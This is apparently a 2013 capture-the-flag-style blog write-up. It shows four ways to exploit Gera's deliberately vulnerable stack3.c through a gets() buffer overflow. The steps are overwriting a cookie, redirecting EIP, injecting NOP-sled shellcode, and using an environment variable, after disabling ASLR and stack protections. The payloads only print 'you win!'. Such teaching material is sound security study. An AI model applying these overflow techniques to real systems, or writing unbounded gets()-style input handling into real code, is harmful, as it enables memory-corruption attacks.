Gera's Warming Up on Stack #3 - Solutions
==========================================
date: 03/Jan/2013
summary: Solutions for Gera's Warming up on Stack #3 program.
tags: exploit, ctf

## Introduction

Following is the part 3 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by Gerardo 'gera' Richarte at the [Insecure Programming by example](http://pages.cs.wisc.edu/~riccardo/sec/) page.

This post follows the [Gera's Warming Up on Stack #2 - Solutions](/posts/20130102_geras-wuos-stack2-solutions.html) post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.

Let's get started. Below is the source for the vulnerable [stack3.c](http://pages.cs.wisc.edu/~riccardo/sec/stack3.html) program:

```c
/* stack3.c                                     *
 * specially crafted to feed your brain by gera */

int main() {
    int cookie;
    char buf[80];

    printf("buf: %08x cookie: %08x\n", &buf, &cookie);
    gets(buf);

    if (cookie == 0x01020005)
        printf("you win!\n");
}
```

The above program accepts user-input through the `gets` function and then looks for a specific value in a local variable named `cookie`. If this value is equal to a certain pre-defined constant, `printf` function is used to show a `you win!` message to the user. There is no direct means of modifying the content of the `cookie` variable. The `gets` function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it print the `you win!` message to stdout.

Here are a few observations that could be made by looking at the source of the program:

- Since it is defined prior to `buf`, the `cookie` would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue
- The `buf` character array would be at an offset of at least 80B from `cookie`
- The `gets` call would accept unbounded user-input within `buf` array and hence it provides a mechanism to alter the call stack contents

Stack layout for [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) is identical to [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) as already outlined in the [Gera's Warming Up on Stack #1 - Solutions](https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html) post.

Here are solutions I could think of to get the `you win!` message
printed:

- [Solution #1: Overflow the internal `buf` array to overwrite `cookie` with `0x01020005`](#solution1)
- [Solution #2: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`](#solution2)
- [Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address](#solution3)
- [Solution #4: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var and overwrite EIP with its address](#solution4)

Here's a brief description of the test system:

```c
# cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
Linux 2.6.38 i686 GNU/Linux
gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
vendor_id   : GenuineIntel
model       : 37
model name  : Intel(R) Core(TM) i3 CPU       M 350  @ 2.27GHz
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
```

## Solutions
<a name="solution1"></a>
### Solution #1: Overflow the internal `buf` array to overwrite cookie with `0x01020005`

Here's the GCC commandline to prepare [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) for this solution:

```c
# gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack3 stack3.c
stack3.c: In function ‘main’:
stack3.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
stack3.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
stack3.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 3 has type ‘int *’
/tmp/ccuoj5F5.o: In function `main':
stack3.c:(.text+0x27): warning: the `gets' function is dangerous and should not be used.
```

All done, let's exploit [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html):

```c
# perl -e 'print "A"x80 . "\x05\x00\x02\x01"' | ./stack3
buf: bfd625a4 cookie: bfd625f4
you win!
```

<a name="solution2"></a>
### Solution #2: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`

We need to have a look at the assembly of [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) and find out the location of the `printf` function which displays the `you win!` message:

```c
# objdump -d -M intel stack3 | grep -A20 main.:
08048444 <main>:
 8048444:   55                      push   ebp
 8048445:   89 e5                   mov    ebp,esp
 8048447:   83 ec 60                sub    esp,0x60
 804844a:   8d 45 fc                lea    eax,[ebp-0x4]
 804844d:   89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048451:   8d 45 ac                lea    eax,[ebp-0x54]
 8048454:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048458:   c7 04 24 50 85 04 08    mov    DWORD PTR [esp],0x8048550
 804845f:   e8 0c ff ff ff          call   8048370 <printf@plt>
 8048464:   8d 45 ac                lea    eax,[ebp-0x54]
 8048467:   89 04 24                mov    DWORD PTR [esp],eax
 804846a:   e8 e1 fe ff ff          call   8048350 <gets@plt>
 804846f:   8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
 8048472:   3d 05 00 02 01          cmp    eax,0x1020005
 8048477:   75 0c                   jne    8048485 <main+0x41>
 8048479:   c7 04 24 68 85 04 08    mov    DWORD PTR [esp],0x8048568
 8048480:   e8 fb fe ff ff          call   8048380 <puts@plt>
 8048485:   c9                      leave
 8048486:   c3                      ret
 8048487:   90                      nop
```

The address turns out to be 0x8048479. Let's try exploiting:

```c
# perl -e 'print "A"x88 . "\x79\x84\x04\x08"' | ./stack3
buf: bfb82e64 cookie: bfb82eb4
you win!
Segmentation fault
```

<a name="solution3"></a>
### Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address

Let's first recompile [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:

```c
# gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack3 stack3.c 2>/dev/null ; readelf -l stack3 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
#
# echo 0 >/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
0
```

Now lets go ahead with exploitation. The Null-free, NOP-prefixed `printf(you win!)` shellcode we used to exploit [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) in the [Gera's Warming Up on Stack #1 - Solutions](/posts/20120827_geras-wuos-stack1-solutions.html) post could be reused here:

```c
# ./stack3
buf: bffff4c4 cookie: bffff514
#
# ./stack3
buf: bffff4c4 cookie: bffff514
#
# perl -e 'print "\x90"x51 . "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21" . "\xc4\xf4\xff\xbf"' | ./stack3
buf: bffff4c4 cookie: bffff514
you win!#
```

<a name="solution4"></a>
### Solution #4: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var overwrite EIP with its address

Lets get straight to exploitation:

```c
# echo $WINCODE | hexdump -C
00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
00000028
#
# ./getenvaddr WINCODE ./stack3
[+] WINCODE: 0xbffff726
#
# perl -e 'print "\x90"x88 . "\x26\xf7\xff\xbf"' | ./stack3
buf: bffff4c4 cookie: bffff514
you win!
```

So, we have now successfully exploited the [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) program through four different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.

## Conclusion

Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.
